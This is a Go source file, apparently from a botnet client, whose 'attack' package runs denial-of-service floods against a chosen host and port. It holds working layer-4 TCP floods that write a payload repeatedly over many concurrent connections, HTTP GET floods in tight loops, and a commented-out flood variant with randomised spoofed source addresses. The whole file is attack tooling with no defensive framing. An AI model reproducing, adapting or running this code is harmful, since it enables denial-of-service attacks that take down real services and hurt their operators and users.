package attack

import (
	"bot/lib/utils"
	"fmt"
	"net"
	"net/http"
	"time"
)

func NewAttack(DestAddr string, DestPort int, Threads int, Power int, Method Method, Time int) *Attack {
	return &Attack{
		DestAddr: DestAddr,
		DestPort: DestPort,
		Threads:  Threads,
		Running:  true,
		Power:    Power,
		Time:     Time,
		Method:   Method,
	}
}

/*
if a.Method.Layer == 4 {
		c := goccm.New(a.Threads)
		dst := &net.TCPAddr{
			IP:   net.ParseIP(a.DestAddr),
			Port: a.DestPort,
		}

		go func() {
			for a.Running {
				c.Wait()

				go func() {
					defer c.Done()

					// Setup TCP src.
					tcp := a.setupTCP(
						&net.TCPAddr{
							IP:   net.ParseIP(a.randSrcIP()),
							Port: rand.Intn(65535),
						}, dst)

					conn, Err := net.Dial("tcp", fmt.Sprintf("%s:%d", a.DestAddr, a.DestPort))
					if Err != nil {
						return
					}
					defer conn.Close()
					conn.SetWriteDeadline(time.Now().Add(time.Second * 1))

					for i := 0; i < a.Power; i++ {
						_, Err = conn.Write(tcp)
						if Err != nil {
							break
						}
					}
				}()
			}
		}()
	}
	*/

func (a *Attack) Run() {
	utils.Debug(fmt.Sprintf("[*] Running l%d.%s flood on %s:%d while %ds [threads=%d] [power=%d]", a.Method.Layer, a.Method.Name, a.DestAddr, a.DestPort, a.Time, a.Threads, a.Power))
	
	if a.Method.Layer == 4 {
		go func() {
			for i := 0; i < a.Threads; i++ {
				go func() {
					for a.Running {
						// create socket and flood
						conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", a.DestAddr, a.DestPort))
						if err != nil {
							continue
						}

						for i := 0; i < a.Power; i++ {
							_, err = conn.Write(a.Method.Payload)
							if err != nil {
								break
							}
						}
					}
				}()
			}
		}()
	}

	if a.Method.Layer == 7 {
		go func() {
			for i := 0; i < a.Threads; i++ {
				go func() {
					for a.Running {
						http.Get(fmt.Sprintf("http://%s:%d", a.DestAddr, a.DestPort))
					}
				}()
			}
		}()
	}

	time.Sleep(time.Second * time.Duration(a.Time))
	a.Running = false
}
